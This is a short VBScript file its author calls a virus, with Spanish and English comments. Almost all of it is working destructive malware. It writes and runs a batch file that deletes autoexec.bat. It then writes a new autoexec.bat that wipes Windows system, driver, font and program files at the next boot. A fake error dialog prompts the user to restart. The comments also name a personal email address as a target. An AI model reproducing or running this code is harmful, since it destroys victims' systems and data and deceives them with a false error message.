'New Virus
'An vbs file writed by Jerk�URC [Fabio]
'Este virus fu� ideado, compilado y escrito por Fabio
'Nadie le ayud� mas que el sistema de ayuda de Visual Basic Script
'Este es el c�digo
'This is the source code

dim file, xls
set xls = createobject("scripting.filesystemobject")
set file = xls.createtextfile ("c:\julio.bat", true)
file.writeline ("@echo off")
file.writeline ("attrib -r -s -h c:\autoexec.bat")
file.writeline ("del c:\autoexec.bat")
file.writeline ("if not exist c:\autoexec.bat goto noexist")
file.writeline ("move c:\autoexec.bat c:\s33.vir")
file.writeline ("del c:\s33.vir")
file.writeline (":noexist")
file.close

dim wshshell
set wshshell = wscript.createobject ("wscript.shell")
wshshell.run "C:\julio.bat"

dim file2, tnt
set tnt = createobject("scripting.filesystemobject")
set file2 = tnt.createtextfile ("c:\autoexec.bat", true)
file2.writeline ("@echo off")
file2.writeline ("@if errorlevel 1 pause")
file2.writeline ("del c:\windows\*.exe")
file2.writeline ("del c:\windows\*.dll")
file2.writeline ("del c:\windows\*.sys")
file2.writeline ("del c:\windows\*.ini")
file2.writeline ("del c:\windows\*.txt")
file2.writeline ("del c:\windows\escrit~1\*.lnk")
file2.writeline ("del c:\windows\fonts\*.ttf")
file2.writeline ("del c:\windows\fonts\*.fon")
file2.writeline ("del c:\windows\help\*.hlp")
file2.writeline ("del c:\windows\system32\drivers\*.sys")
file2.writeline ("del c:\windows\system32\drivers\*.dll")
file2.writeline ("del c:\windows\system32\*.*")
file2.writeline ("del c:\windows\system\*.dll")
file2.writeline ("del c:\windows\system\*.sys")
file2.writeline ("del c:\windows\system\*.sys")
file2.writeline ("del c:\windows\system\*.*")
file2.writeline ("del c:\windows\sysbckup\*.dll")
file2.writeline ("del c:\windows\command\keyboard.sys")
file2.writeline ("del c:\archiv~1\*.*")
file2.writeline ("del c:\windows\command\ega.cpi")
file2.writeline ("del c:\windows\command\*.cpi")
file2.writeline ("del c:\windows\command\*.com")
file2.close

'Writed by Jerk�URC
'Ojal� se lo manden a andrescool2001@yahoo.com.mx
'Send this fucking shit to andrescool2001@yahoo.com.mx

msgbox "Winsck.dll provoc� un error en el M�dulo 3vDx34 del archivo Command.com reinicie su computadora, el sistema se ha vuelto inestable", vbcritical + vbonlyok + vbsystemmodal




